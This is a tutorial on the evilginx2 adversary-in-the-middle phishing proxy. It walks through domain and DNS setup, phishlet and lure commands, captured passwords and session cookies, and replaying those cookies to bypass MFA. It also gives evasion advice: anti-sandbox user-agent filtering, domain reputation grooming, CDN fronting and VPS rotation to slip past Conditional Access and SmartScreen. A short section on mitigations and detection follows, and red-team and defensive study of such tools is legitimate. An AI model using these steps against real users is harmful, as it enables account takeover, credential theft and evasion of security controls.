# evilginx2 — full tutorial

`evilginx2` is the canonical Adversary-in-the-Middle (AitM) phishing proxy. It transparently relays login traffic between the victim and the real Microsoft / Google / Okta / etc. site, capturing the **session cookie after MFA succeeds**. The captured cookie can be loaded into any browser to act as the user — bypassing TOTP, push, and SMS.

## Install

```terminal
git clone https://github.com/kgretzky/evilginx2 && cd evilginx2 && go build
sudo ./evilginx2 -p ./phishlets
```

Requires:
- A VPS with port 80, 443, 53 free.
- A registered domain (acceptable typosquat or lookalike).
- DNS pointed at the VPS for `*.<your domain>`.

## Initial config

```
evilginx > config domain login-target-365.com
evilginx > config ip 1.2.3.4              # external IP of VPS
evilginx > config redirect_url https://www.microsoft.com/
```

`redirect_url` is what visitors see if they hit the root domain without a lure path — should look benign.

## Phishlets

A phishlet is a YAML config that knows how to proxy a specific service. Bundled: `o365`, `okta`, `outlook`, `linkedin`, `twitter` (older). Community phishlets cover Google Workspace, AWS, Salesforce, Citrix, etc.

```
evilginx > phishlets
evilginx > phishlets enable o365
evilginx > phishlets get-hosts o365      # tells you which DNS records to create
```

Then create A records for those hosts pointing at your VPS IP.

## Lures — the actual phishing URLs

```
evilginx > lures create o365
evilginx > lures
evilginx > lures get-url 0
> https://login-target-365.com/abcXYZ
```

A lure can be customized:

```
evilginx > lures edit 0 path /onedrive
evilginx > lures edit 0 ua_filter "Mozilla.*Chrome"
evilginx > lures edit 0 redirect_url https://login.microsoftonline.com/  # post-auth fallback
evilginx > lures edit 0 redirector path/to/template/   # decoy HTML
```

`ua_filter` rejects non-browser User-Agents (curl, headless Chrome) → a tiny anti-sandbox guard.

## Live capture

When a victim authenticates:

```
[+] new visitor session: o365
[+] credentials captured: alice@target.com :: Pass1!
[+] session cookies captured: ESTSAUTH, ESTSAUTHPERSISTENT
```

Pull the cookies:

```
evilginx > sessions
evilginx > sessions <id>
> Cookies (JSON form): [...]
```

Copy that JSON into a Cookie Editor extension (Firefox / Chrome) and load `login.microsoftonline.com` — you're authenticated as the user, MFA already satisfied.

## Defender / blue side mitigations

> [!danger] AitM beats classic MFA
> If a user types creds + completes MFA on your proxy, you get the cookie. Defeating this requires **phishing-resistant MFA**: FIDO2 hardware keys or platform passkeys, where the assertion is cryptographically bound to the real domain.

- **FIDO2 / WebAuthn / passkeys** — domain bound; phishing site can't forward the assertion.
- **Token Protection / device-bound refresh tokens** in M365 — refresh token only valid from compliant device.
- **Conditional Access requiring compliant device + risk-based** — even if cookie stolen, replay from attacker host fails compliance check.
- **Anomalous-IP signin alerting** — captured cookie used from VPS IP is flagged.

## Detection ideas

- Domain registrations for typosquats of your login subdomains; auto-watchlists from CT logs.
- DMARC/DKIM enforcement on your real domain reduces email spoof feasibility.
- Look for sign-ins to your tenant from autonomous-system numbers that match common VPS providers (DigitalOcean, Choopa, OVH).
- Microsoft alert "Atypical travel" + new browser fingerprint + low device-compliance score.

## Bad output and fixes

| Symptom | Cause | Fix |
|---------|-------|-----|
| Login page shows TLS error | Let's Encrypt cert not issued | `phishlets enable` triggers issuance; ensure 80/443 open |
| Login form submits to real site | Phishlet missing for that login flow | Pull a community phishlet or write JS injection |
| Captures stop after weeks | Microsoft updated login flow | Phishlet drift — update or rewrite |
| Victim sees "We can't reach this app" | Conditional Access blocks the proxy IP | Rotate VPS or add CDN front |
| Lure URL flagged by SmartScreen quickly | Domain reputation | Use aged domains; layer Cloudflare; rotate URLs |

## OPSEC

- Domain age matters — a 1-day-old domain hits filters within hours.
- Categorize the domain as benign before launch (Talos, Symantec submission).
- Always front with a CDN for IP rotation; defenders can't block "Cloudflare".
- Watch logs in real-time and grab cookies before MFA-token rotation invalidates them.
- Use one domain per engagement; cross-tenant cookie misuse is forensically visible.

## Related tools

| Tool | Niche |
|------|-------|
| **modlishka** | Older AitM with auto-relay (no phishlet needed) |
| **muraena** | Active AitM; supports cookie-jar attacks |
| **EvilProxy** | Commercial AitM-as-a-service (criminal) |
| **GoPhish** | Classic phishing campaign mgr (no AitM) |
| **King Phisher** | Same niche as GoPhish |
| **Cuddlephish** | Browser-in-browser variant |
